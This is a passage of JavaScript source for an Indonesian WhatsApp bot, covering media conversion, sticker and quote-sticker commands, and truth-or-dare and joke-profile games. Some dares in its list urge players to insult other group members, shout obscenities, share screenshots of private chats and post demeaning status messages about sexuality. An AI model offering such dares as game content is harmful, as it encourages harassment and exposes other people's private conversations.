let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await RyuuBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversi Webp ke Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyReinzID(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replyReinzID(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            RyuuBotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyReinzID(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replyReinzID(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            RyuuBotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) return replyReinzID('Reply video')
if (!/webp/.test(mime)) return replyReinzID(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await RyuuBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replyReinzID(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./node_modules/Arisu-MD/'+buff, data)
   let medi = fs.readFileSync('./node_modules/Arisu-MD/' + buff)
  await RyuuBotz.sendMessage(from, { image: medi, caption:"Ini dia!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
"Makan 2 sendok makan nasi tanpa lauk apapun, jika terasa berat, kamu bisa minum.",
"Sebutkan orang yang membuatmu terdiam",
"Telepon gebetan/pacar sekarang dan kirim tangkapan layar di sini",
"Kirim emot hanya setiap kali kamu mengetik di grup obrolan/obrolan pribadi selama 1 hari.",
"Ucapkan 'Selamat datang di Who Wants To Be a Millionaire!' ke semua grup yang kamu punya",
"Telepon mantan dengan mengatakan rindu",
"nyanyikan chorus dari lagu terakhir yang kamu mainkan",
"Rekam suara untuk mantan/pacar/gebemmu, katakan 'Hai (nama), ingin menelepon, tunggu sebentar. Aku sangat merindukanmu'",
"Pukul meja (yang ada di rumah) sampai kamu dimarahi karena berisik",
"Katakan pada orang asing 'Aku baru saja diberitahu bahwa aku adalah saudaramu yang pertama, kami berpisah, lalu aku melakukan operasi plastik. Dan ini hal paling 'ciyusss'",
"Sebutkan nama mantan",
"buat 1 sajak untuk anggota grup!",
"Kirim daftar percakapan WhatsAppmu",
"Obrol dengan orang asing dengan bahasa ghetto lalu tangkap layar di sini",
"Ceritakan versimu sendiri tentang hal-hal memalukan",
"Tag orang yang kamu benci",
"Pura-pura seperti terkena pengaruh, misalnya: terkena pengaruh anjing, terkena pengaruh belalang, terkena pengaruh lemari es, dll.",
"Ubah nama menjadi *I AM DONKEY* selama 24 jam",
"Teriak *ma chuda ma chuda ma chuda* di depan rumahmu",
"Ambil foto/potret pacar atau gebetanmu dan kirimkan di sini",
"Ceritakan tipe pacar yang kamu sukai!",
"Ucapkan *aku naksir kamu, maukah kamu menjadi pacarku?* kepada lawan jenis, terakhir kali kamu berbicara dengannya (kirim di WA/Telegram), tunggu sampai dia membalas, jika sudah, berikan di sini",
"Rekam suaramu yang membaca *titar ke age do titar, titar ke piche do titar*",
"Chatingan lelucon dengan mantan dan katakan *aku mencintaimu, tolong kembalilah.* tanpa menyebutkan bahwa itu adalah tantangan!",
"Obrol dengan kontak WhatsApp berurutan sesuai dengan persentase baterai ponselmu, lalu katakan 'Aku beruntung memiliki kamu!'",
"Ubah nama menjadi *I am a child of randi* selama 5 jam",
"Ketik dalam bahasa Bengali selama 24 jam",
"Gunakan foto Selmon Bhoi selama 3 hari",
"Kirim kutipan lagu lalu tag anggota yang cocok untuk kutipan tersebut",
"Kirim pesan suara dengan ucapan 'Bolehkah aku memanggilmu sayang?'",
"Tangkapan layar percakapan terakhir di WhatsAppmu",
"Ucapkan *KAMU SANGAT CANTIK, JANGAN BERBOHONG* kepada teman pria!",
"Telepon salah satu anggota grup dan katakan kata kasar kepada mereka",
"Berlakulah seperti ayam di depan orangtua kamu",
"Ambil sebuah buku secara acak dan bacakan satu halaman secara keras dan rekam suara lalu kirimkan di sini",
"Buka pintu depan rumahmu dan menyalak seperti serigala selama 10 detik",
"Ambil foto selfie yang memalukan dan jadikan sebagai foto profilmu",
"Biar grup memilih sebuah kata dan lagu yang dikenal. Kamu harus menyanyikan lagu tersebut dan kirim dalam bentuk pesan suara di sini",
"Berjalanlah dengan menopang dengan siku dan lutut selama yang kamu bisa",
"nyanyikan lagu kebangsaan dalam pesan suara",
"Lakukan breakdance selama 30 detik di ruang tamu",
"Ceritakan cerita sedih yang kamu ketahui",
"Buat video tari twerk singkat dan unggah sebagai status selama 5 menit",
"Makan sepotong bawang putih mentah",
"Tunjukkan lima orang terakhir yang kamu kirim pesan dan isi pesan mereka",
"Jadikan nama lengkapmu sebagai status selama 5 jam",
"Buat video tari singkat tanpa filter hanya dengan musik dan unggah sebagai status selama 5 jam",
"Telepon sahabatmu, omong kosong",
"Jadikan foto dirimu tanpa filter sebagai status selama 10 menit",
"Ucapkan 'aku cinta Oli London' dalam pesan suara 😄",
"Kirim pesan kepada mantanmu dan katakan bahwa kamu masih menyukainya",
"Telepon gebetan/pacar/sahabatmu sekarang dan tangkapan layar di sini",
"Berkata kasar pada salah satu anggota grup di percakapan pribadi dan katakan 'kamu jelek, beban'",
"Ucapkan 'KAMU CANTIK/GANTENG' pada salah satu orang yang ada di atas pinlistmu atau orang pertama di daftar percakapanmu",
"Kirim pesan suara dan katakan 'Bisakah aku memanggilmu sayang?'. Jika kamu seorang pria, sebutkan nama seorang wanita. Jika kamu seorang wanita, sebutkan nama seorang pria",
"Tulis 'Aku mencintaimu (nama anggota grup acak yang sedang online) dalam percakapan pribadi (jika kamu pria, tulis nama wanita; jika kamu wanita, tulis nama pria), ambil tangkapan layar dan kirimkan di sini",
"Gunakan foto aktor Bollywood sebagai foto profilmu selama 3 hari",
"Jadikan foto crushmu sebagai status dengan caption 'Ini adalah crushku'",
"Ubah nama menjadi *I AM GAY* selama 5 jam",
"Obrol dengan salah satu kontak di WhatsApp dan katakan 'Aku akan menjadi pacarmu selama 5 jam'",
"Kirim pesan suara dan katakan 'Aku naksir kamu, maukah kamu menjadi pacarku?' kepada orang acak dari grup (jika kamu perempuan, pilih nama laki-laki; jika kamu laki-laki, pilih nama perempuan)",
"Pukul pantatmu dengan keras dan kirim suara tamparan melalui pesan suara 😂",
"Sebutkan tipe pacarmu dan kirim fotonya di sini dengan keterangan 'Perempuan/laki-laki paling jelek di dunia'",
"Teriak 'bravooooooooo' dan kirimkan melalui pesan suara di sini",
"Ambil foto wajahmu dan kirim di sini",
"Kirim foto dirimu dengan keterangan 'Aku lesbian'",
"Teriak dengan menggunakan kata-kata kasar dan kirim melalui pesan suara",
"Teriak 'kamu bajingan' di depan ibu atau ayahmu",
"Ubah nama menjadi *aku bodoh selama 24 jam*",
"Pukul dirimu sendiri dengan mantap dan kirim suara pukulan melalui pesan suara 😂",
"Ucapkan 'aku cinta pemilik bot Reinz' melalui pesan suara",
"Kirim foto pacar atau gebetanmu di sini",
"Buat video tantangan tarian TikTok apa pun dan unggah sebagai status, kamu bisa menghapusnya setelah 5 jam",
"Putuskan pertemanan dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu adalah tantangan",
"Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikahinya, tanpa memberitahunya bahwa itu adalah tantangan",
"Ucapkan 'aku cinta Depak Kalal' melalui pesan suara",
"Tulis 'aku merasa horny' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Tulis 'aku lesbian' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Cium ibu atau ayahmu dan katakan 'aku mencintaimu' 😌",
"Jadikan nama ayahmu sebagai status selama 5 jam",
"Kirim kata-kata kasar dalam grup manapun, kecuali grup ini, dan kirim bukti tangkapan layarnya di sini"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              RyuuBotz.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
        break
       case 'truth':
              const truth =[
"Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Jika kamu bisa atau jika kamu mau, grup obrolan atau grup di luar mana yang ingin kamu jadikan teman? (bisa berbeda/jenis yang sama)",
    "Apa ketakutan terbesar kamu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang dulu pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang dari ayah atau ibumu? Alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Pernahkah kamu memiliki perasaan cinta satu arah? jika ya kepada siapa? bagaimana perasaannya, bro?",
    "Pernah menjadi selingkuhan seseorang?",
    "Hal paling ditakuti?",
    "Siapa orang yang paling berpengaruh dalam hidupmu?",
    "Prestasi apa yang berhasil kamu raih tahun ini?",
    "Siapa orang yang bisa membuatmu keren?",
    "Siapa orang yang pernah membuatmu sangat bahagia?",
    "Siapa yang paling mendekati tipe pasangan idamanmu di sini?",
    "Dengan siapa kamu suka bermain?",
    "Pernahkah kamu menolak seseorang? alasan mengapa?",
    "Sebutkan insiden yang pernah menyakiti perasaanmu yang masih kamu ingat",
    "Prestasi apa yang sudah kamu capai tahun ini?",
    "Kebiasaan terburukmu di sekolah?",
    "Lagu apa yang paling sering kamu nyanyikan di dalam kamar mandi?",
    "Pernahkah kamu mengalami pengalaman dekat dengan kematian?",
    "Kapan terakhir kali kamu sangat marah? Mengapa?",
    "Siapa orang terakhir yang meneleponmu?",
    "Apakah kamu memiliki bakat tersembunyi? Apa sajakah itu?",
    "Kata apa yang paling kamu benci?",
    "Video YouTube terakhir apa yang kamu tonton?",
    "Hal terakhir apa yang kamu cari di Google?",
    "Dalam grup ini, dengan siapa yang ingin kamu tukar kehidupan selama seminggu?",
    "Apa hal paling menakutkan yang pernah terjadi padamu?",
    "Pernahkah kamu kentut dan menyalahkannya kepada orang lain?",
    "Kapan terakhir kali kamu membuat orang lain menangis?",
    "Pernahkah kamu menghilangkan jejak dari seorang teman?",
    "Pernahkah kamu melihat mayat?",
    "Anggota keluargamu yang paling mengganggumu dan mengapa?",
    "Jika kamu harus menghapus satu aplikasi dari ponselmu, aplikasi mana yang akan kamu hapus?",
    "Aplikasi apa yang paling sering kamu buang-buang waktu di dalamnya?",
    "Pernahkah kamu berpura-pura sakit untuk pulang dari sekolah?",
    "Apa barang paling memalukan di dalam kamar kamarmu?",
    "Jika terdampar di pulau terpencil, lima barang apa yang akan kamu bawa?",
    "Pernahkah kamu tertawa begitu keras hingga pipismu basah?",
    "Apakah kamu mencium bau kentutmu sendiri?",
    "Pernahkah kamu kencing di tempat tidur saat tidur?",
    "Apa kesalahan terbesar yang pernah kamu buat?",
    "Pernahkah kamu mencontek dalam ujian?",
    "Apa hal terburuk yang pernah kamu lakukan?",
    "Kapan terakhir kali kamu menangis?",
    "Di antara orang tua kamu, siapa yang kamu cintai paling?",
    "Apakah kamu kadang-kadang memasukkan jari ke dalam lubang hidungmu?",
    "Siapa pujaan hati kamu saat masa sekolah dulu?",
    "Berbicara jujur, apakah kamu menyukai seorang anak laki-laki dalam grup ini?",
    "Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang milik ibu atau ayahmu? Apa alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Apakah kamu menyukai seseorang dalam grup ini? Jika ya, siapa?",
    "Pernahkah kamu ditipu oleh seseorang?",
    "Siapa orang yang paling penting dalam hidupmu?",
    "Prestasi apa yang telah kamu capai tahun ini?",
    "Siapa orang yang bisa membuatmu bahagia saat sedang sedih?",
    "Siapa orang yang pernah membuatmu merasa tidak nyaman?",
    "Pernahkah kamu berbohong kepada orang tua?",
    "Apakah kamu masih menyukai mantan pacarmu?",
    "Siapa yang ingin kamu ajak bermain bersama?",
    "Pernahkah kamu mencuri sesuatu yang besar? Alasannya apa?",
    "Sebutkan insiden yang pernah membuatmu terluka dan masih kamu ingat?",
    "Prestasi apa yang sudah kamu raih tahun ini?",
    "Apa kebiasaan terburukmu saat di sekolah?",
    "Apakah kamu mencintai pencipta bot ini, Dani 😄",
    "Pernahkah kamu berpikir untuk membalas dendam pada guru?",
    "Apakah kamu menyukai perdana menteri saat ini di negaramu?",
    "Apakah kamu vegetarian atau non-vegetarian?",
    "Jika kamu bisa menjadi tak terlihat, apa yang pertama kali akan kamu lakukan?",
    "Apa rahasia yang kamu simpan dari orang tua kamu?",
    "Siapa pujaan hati rahasiamu?",
    "Siapa orang terakhir yang kamu intip di media sosial?",
    "Jika seorang jin memberimu tiga permintaan, apa yang akan kamu minta?",
    "Apa penyesalan terbesarmu?",
    "Hewan seperti apa menurutmu yang paling mirip denganmu?",
    "Berapa banyak foto selfie yang kamu ambil dalam sehari?",
    "Apa acara favoritmu saat masa kanak-kanak?",
    "Jika kamu bisa menjadi karakter fiksi dalam satu hari, siapa yang akan kamu pilih?",
    "Dengan siapa kamu paling sering mengirim pesan?",
    "Apa kebohongan terbesar yang pernah kamu ceritakan kepada orang tua kamu?",
    "Siapa selebriti yang menjadi pujaan hatimu?",
    "Mimpi paling aneh yang pernah kamu alami?",
    "Apakah kamu bermain PUBG? Jika ya, berikan nomor ID-mu."
]
              const ReinzIDtruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              RyuuBotz.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ ReinzIDtruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ["Baik", "Tidak ramah", "Chapri", "Nibba/nibbi", "Mengganggu", "Rusak", "Orang marah", "Sopan", "Beban", "Hebat", "Cringe", "Pembohong"]
					var hoby = ['Memasak','Menari','Bermain','Bermain game','Melukis','Membantu Orang Lain','Menonton anime','Membaca','Bersepeda','Bernyanyi','Berbincang-bincang','Berbagi Meme','Menggambar','Menghabiskan Uang Orang Tua','Bermain Truth or Dare','Menghabiskan Waktu Sendirian']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Ya', 'Tidak', 'Sangat jelek', 'Sangat tampan']
					var wetak= ['Peduli','Murah hati','Orang marah','Maaf','Tunduk','Baik','Maafkan aku','Berhati baik','Sabar','UwU','Terbaik','Membantu']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*karakteristik :* ${sipat}
*Hobby :* ${biho}
*bucin :* ${bhucin}%
*Great :* ${senga}%
*Ganteng :* ${chakep}
*Character :* ${watak}
*Moral Baik :* ${baik}%
*Morals Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Penakut :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(defaultpp)
RyuuBotz.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
	RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replyReinzID(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await RyuuBotz.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            RyuuBotz.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replyReinzID(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await RyuuBotz.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break

case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Berhasil menghapus semua Kenangan <3")
	 
	});
	  }
	break 
	//================================================================================

case "qc5": {
if (!text) return reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await RyuuBotz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./node_modules/Arisu-MD/database/rentbot/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return reply("Error")
await RyuuBotz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break;
//================================================================================
case 'qc2':
case 'qc-warna': {
  const colorMap = {
    'putih': '#FFFFFF', 'hijau': '#00FF00', 'kuning': '#FFFF00', 'hitam': '#000000',
    'merah': '#FF0000', 'biru': '#0000FF', 'ungu': '#800080', 'jingga': '#FFA500',
    'pink': '#FFC0CB', 'abu-abu': '#808080', 'coklat': '#A52A2A', 'cyan': '#00FFFF',
    'magenta': '#FF00FF', 'maroon': '#800000', 'navy': '#000080', 'olive': '#808000',
    'orange': '#FFA500', 'purple': '#800080', 'silver': '#C0C0C0', 'teal': '#008080',
    'turquoise': '#40E0D0', 'violet': '#EE82EE', 'salmon': '#FA8072', 'gold': '#FFD700',
    'indigo': '#4B0082', 'lime': '#00FF00', 'skyblue': '#87CEEB', 'tan': '#D2B48C',
    'orchid': '#DA70D6', 'coral': '#FF7F50'
  }

  let text, apiColor = '#FFFFFF'

  if (args.length === 0 && !(m.quoted?.text)) {
    let warnaList = Object.keys(colorMap).sort().map(v => `- ${v}`).join('\n')
    return reply(`*🧾 Cara Pakai Fitur Quote (Stiker Teks)*

Ketik:
.qc2 <warna>|<teks>

📌 Contoh:
.qc2 pink|aku sayang kamu

📌 Bisa juga reply pesan lalu ketik:
.qc2 pink

🎨 Daftar Warna:
${warnaList}
`)
  }

  if (args.length > 0) {
    let input = args.join(" ").split("|")
    if (input.length === 2) {
      const colorName = input[0].trim().toLowerCase()
      text = input[1].trim()
      apiColor = colorMap[colorName] || apiColor
    } else if (m.quoted?.text) {
      const colorName = args[0].trim().toLowerCase()
      text = m.quoted.text
      apiColor = colorMap[colorName] || apiColor
    } else {
      return reply('Format salah! Contoh: .qc2 pink|halo kamu')
    }
  } else if (m.quoted?.text) {
    text = m.quoted.text
  }

  if (!text) return reply('Teksnya mana? Contoh: .qc2 merah|halo sayang')
  if (text.length > 100) return reply('Teks terlalu panjang! Maksimal 100 karakter.')

  RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})

  let ppuser
  try {
    ppuser = await RyuuBotz.profilePictureUrl(m.sender, 'image')
  } catch {
    ppuser = 'https://telegra.ph/file/c6fbacafe23d6ab6a801e.jpg'
  }

  const obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: apiColor,
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: {
        id: 1,
        name: pushname,
        photo: { url: ppuser }
      },
      text: text,
      replyMessage: {}
    }]
  }

  try {
    const { data } = await axios.post('https://bot.lyo.su/quote/generate', obj, {
      headers: { 'Content-Type': 'application/json' }
    })

    const buffer = Buffer.from(data.result.image, 'base64')
    await RyuuBotz.sendImageAsSticker(m.chat, buffer, m, {
      packname: global.packname,
      author: global.author
    })
  } catch (err) {
    console.error(err)
    reply('Gagal membuat stiker quote.')
  }
}
break;
case 'qc': {
  if (!text) return reply('Teksnya mana? Contoh: qc halo dunia');
  
  RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  
  let ppuser;
  try {
    ppuser = await RyuuBotz.profilePictureUrl(m.sender, 'image');
  } catch (err) {
    ppuser = 'https://telegra.ph/file/c6fbacafe23d6ab6a801e.jpg';
  }

  const obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [{
      entities: [],
      avatar: true,
      from: {
        id: 1,
        name: pushname,
        photo: { url: ppuser }
      },
      text: text,
      replyMessage: {}
    }]
  };

  try {
    const { data } = await axios.post('https://bot.lyo.su/quote/generate', obj, {
      headers: { 'Content-Type': 'application/json' }
    });

    const buffer = Buffer.from(data.result.image, 'base64');
    await RyuuBotz.sendImageAsSticker(m.chat, buffer, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error(err);
    reply('Gagal membuat stiker quote.');
  }
}
break;
case 's':
case 'stiker':
case 'sticker': {
  if (!quoted) return reply(`ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ`)
  RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await RyuuBotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 80) return reply('ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ')
RyuuBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let media = await quoted.download()
let encmedia = await RyuuBotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
reply(`ᴋɪʀɪᴍ ᴀᴛᴀᴜ ʀᴇᴘʟʏ ғᴏᴛᴏ/ᴠɪᴅᴇᴏ/ɢɪғ ᴡɪᴛʜ ᴄᴀᴘᴛɪᴏɴs ${prefix+command}\nᴠɪᴅᴇᴏ ᴅᴜʀᴀsɪ 1-20 ᴅᴇᴛɪᴋ`)
}
}
break
case 'spotifyplay':
case 'plays':
case 'spotplay': {
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  const fetch = require('node-fetch');
  const { Spotify } = require('canvafy');
  if (!args.length) return reply(`masukkan judul lagu nya 🙄 contoh : ${prefix + command} night changes`);
  const query = args.join(' ');
  const searchUrl = `https://zenz.biz.id/search/spotify?query=${encodeURIComponent(query)}`;
  
  try {
    const res = await fetch(searchUrl);
    if (!res.ok) throw new Error(`Gagal fetch search API: ${res.status}`);
